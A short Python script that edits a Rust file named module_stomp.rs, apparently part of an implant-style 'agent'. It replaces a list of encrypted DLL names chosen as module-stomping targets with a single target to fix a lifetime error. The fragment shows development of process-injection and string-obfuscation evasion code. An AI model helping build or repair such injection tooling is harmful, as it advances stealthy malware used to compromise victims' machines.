import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error by abandoning loop format
text = text.replace('''            let mut candidates: Vec<Vec<u8>> = Vec::new();
            candidates.push(enc_str!("msfte.dll").to_vec());
            candidates.push(enc_str!("msratelc.dll").to_vec());
            candidates.push(enc_str!("scrobj.dll").to_vec());
            candidates.push(enc_str!("amstream.dll").to_vec());

            // Iterate until we find one and get a handle
            let target_dll = &candidates[0];''', '''
            // The macro strings can drop unless we do it this way 
            let target_dll_str = enc_str!("msfte.dll"); 
            let target_dll = target_dll_str.as_ref();
''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

